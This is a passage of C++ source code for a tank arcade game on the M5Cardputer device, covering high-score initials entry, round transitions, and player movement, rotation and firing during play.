            if (ki.arrowRight && _hsCursor < 2) { _hsCursor++; _needsRedraw = true; }
            if (ki.arrowLeft  && _hsCursor > 0) { _hsCursor--; _needsRedraw = true; }
            if (ki.ch) {
                char c = ki.ch;
                if (c >= 'a' && c <= 'z') c = c - 'a' + 'A';
                if (c >= 'A' && c <= 'Z') {
                    _hsInitials[_hsCursor] = c;
                    if (_hsCursor < 2) _hsCursor++;
                    _needsRedraw = true;
                }
            }
            if (ki.enter || ki.fn) {
                _hsEntryDone = true;
                _submitFinalScore();
                _needsRedraw = true;
            }
            if (ki.esc) { _phase=PH_SPLASH; _needsRedraw=true; return; }
        } else {
            // Browsing scores: left/right switches tab
            if (ki.arrowLeft  || ki.arrowRight) { _hsTab ^= 1; _needsRedraw = true; }
            if (ki.ch == ',' || ki.ch == 'l')   { _hsTab = 0; _needsRedraw = true; }
            if (ki.ch == '/' || ki.ch == '\'')  { _hsTab = 1; _needsRedraw = true; }
            if (ki.enter) {
                _codexPage=0; _phase=PH_CODEX; _phaseEnter=millis(); _needsRedraw=true;
                _hs.disconnect(); return;
            }
            if (ki.esc) {
                _phase=PH_SPLASH; _needsRedraw=true;
                _hs.disconnect(); return;
            }
        }
        return;
    }

    if (_phase == PH_ROUND_CLEAR) {
        static constexpr unsigned long CLEAR_MS=5000;
        unsigned long elapsed=millis()-_phaseEnter;
        int secsNow=(int)((CLEAR_MS-min(elapsed,CLEAR_MS))/1000);
        if (_needsRedraw || secsNow!=_previewLastSec) {
            _previewLastSec=secsNow; _drawRoundClear(); _needsRedraw=false;
        }
        // Debounce: the last shot that killed the final enemy often fires on the
        // same frame the phase transitions, so ignore input for the first 400ms.
        if (millis() - _phaseEnter < 400) return;
        KeyInput ki = pollKeys();
        if (ki.esc)   { _phase=PH_SPLASH; _needsRedraw=true; return; }
        if (ki.enter || ki.fn || elapsed >= CLEAR_MS) {
            _round++;
            _startNextRound();
            _phase=PH_PREVIEW; _phaseEnter=millis(); _needsRedraw=true;
        }
        return;
    }

    if (_phase == PH_PREVIEW) {
        static constexpr unsigned long PREVIEW_MS=7000;
        unsigned long elapsed=millis()-_phaseEnter;
        int secsNow=(int)((PREVIEW_MS-min(elapsed,PREVIEW_MS))/1000);
        if (_needsRedraw || secsNow!=_previewLastSec) {
            _previewLastSec=secsNow; _drawPreview(); _needsRedraw=false;
        }
        KeyInput ki = pollKeys();
        if (ki.esc)            { _phase=PH_SPLASH; _needsRedraw=true; return; }
        if (ki.enter||ki.fn)   { _phase=PH_PLAYING; _needsRedraw=true; return; }
        if (elapsed >= PREVIEW_MS) { _phase=PH_PLAYING; _needsRedraw=true; }
        return;
    }

    // PH_PLAYING
    uiManager.notifyInteraction();
    M5Cardputer.update();
    unsigned long now = millis();

    if (M5Cardputer.Keyboard.isPressed()) {
        auto ks = M5Cardputer.Keyboard.keysState();

        for (uint8_t hk : ks.hid_keys)
            if (hk == 0x29) { _phase=PH_SPLASH; _needsRedraw=true; return; }
        for (char c : ks.word)
            if (c == 0x1B) { _phase=PH_SPLASH; _needsRedraw=true; return; }

        // Movement with wall sliding
        for (char c : ks.word) {
            if (c == ',' || c == 'l') _player.angle = wrapAngle(_player.angle - ROTATE_SPEED);
            if (c == '/' || c == '\'') _player.angle = wrapAngle(_player.angle + ROTATE_SPEED);
            if (c == ';') {
                float spd=SPEED*_playerSpeed;
                float nx=_player.x+cosf(_player.angle)*spd, ny=_player.y+sinf(_player.angle)*spd;
                if (!_circleWall(nx,ny,TANK_R)) {
                    _player.x=fclamp(nx,TANK_R,VAW-TANK_R); _player.y=fclamp(ny,TANK_R,VPLAY_H-TANK_R);
                } else {
                    if (!_circleWall(nx,_player.y,TANK_R)) _player.x=fclamp(nx,TANK_R,VAW-TANK_R);
                    if (!_circleWall(_player.x,ny,TANK_R)) _player.y=fclamp(ny,TANK_R,VPLAY_H-TANK_R);
                }
            }
            if (c == '.') {
                float spd=SPEED*_playerSpeed;
                float nx=_player.x-cosf(_player.angle)*spd, ny=_player.y-sinf(_player.angle)*spd;
                if (!_circleWall(nx,ny,TANK_R)) {
                    _player.x=fclamp(nx,TANK_R,VAW-TANK_R); _player.y=fclamp(ny,TANK_R,VPLAY_H-TANK_R);
                } else {
                    if (!_circleWall(nx,_player.y,TANK_R)) _player.x=fclamp(nx,TANK_R,VAW-TANK_R);
                    if (!_circleWall(_player.x,ny,TANK_R)) _player.y=fclamp(ny,TANK_R,VPLAY_H-TANK_R);
                }
            }
        }
        for (uint8_t hk : ks.hid_keys) {
            if (hk == 0x52) {
                float spd=SPEED*_playerSpeed;
                float nx=_player.x+cosf(_player.angle)*spd, ny=_player.y+sinf(_player.angle)*spd;
                if (!_circleWall(nx,ny,TANK_R)) {
                    _player.x=fclamp(nx,TANK_R,VAW-TANK_R); _player.y=fclamp(ny,TANK_R,VPLAY_H-TANK_R);
                } else {
                    if (!_circleWall(nx,_player.y,TANK_R)) _player.x=fclamp(nx,TANK_R,VAW-TANK_R);
                    if (!_circleWall(_player.x,ny,TANK_R)) _player.y=fclamp(ny,TANK_R,VPLAY_H-TANK_R);
                }
            }
            if (hk == 0x51) {
                float spd=SPEED*_playerSpeed;
                float nx=_player.x-cosf(_player.angle)*spd, ny=_player.y-sinf(_player.angle)*spd;
                if (!_circleWall(nx,ny,TANK_R)) {
                    _player.x=fclamp(nx,TANK_R,VAW-TANK_R); _player.y=fclamp(ny,TANK_R,VPLAY_H-TANK_R);
                } else {
                    if (!_circleWall(nx,_player.y,TANK_R)) _player.x=fclamp(nx,TANK_R,VAW-TANK_R);
                    if (!_circleWall(_player.x,ny,TANK_R)) _player.y=fclamp(ny,TANK_R,VPLAY_H-TANK_R);
                }
            }
            if (hk==0x50) _player.angle=wrapAngle(_player.angle-ROTATE_SPEED);
            if (hk==0x4F) _player.angle=wrapAngle(_player.angle+ROTATE_SPEED);
        }

        if ((ks.fn||ks.enter) && now-_player.lastShot > (unsigned long)_fireCooldown) {
            uint8_t bt  = _puHeavyShot ? BT_PLAYER_H : BT_NORMAL;
            int     dmg = _puHeavyShot ? 2 : 1;
            if (_puSpread) {
                _fireBullet(_player, true, bt, -0.2f, dmg);
                _fireBullet(_player, true, bt,  0.f,  dmg);
                _fireBullet(_player, true, bt,  0.2f, dmg);
            } else {
                _fireBullet(_player, true, bt, 0.f, dmg);
            }
        }
    }

    if (M5Cardputer.BtnA.wasPressed() && now-_player.lastShot > (unsigned long)_fireCooldown) {
        uint8_t bt  = _puHeavyShot ? BT_PLAYER_H : BT_NORMAL;
        int     dmg = _puHeavyShot ? 2 : 1;
        if (_puSpread) {
            _fireBullet(_player, true, bt, -0.2f, dmg);
            _fireBullet(_player, true, bt,  0.f,  dmg);
            _fireBullet(_player, true, bt,  0.2f, dmg);
        } else {
            _fireBullet(_player, true, bt, 0.f, dmg);
        }
    }

    _update(now);
    _drawArena();
}

} // namespace Cardputer
#endif
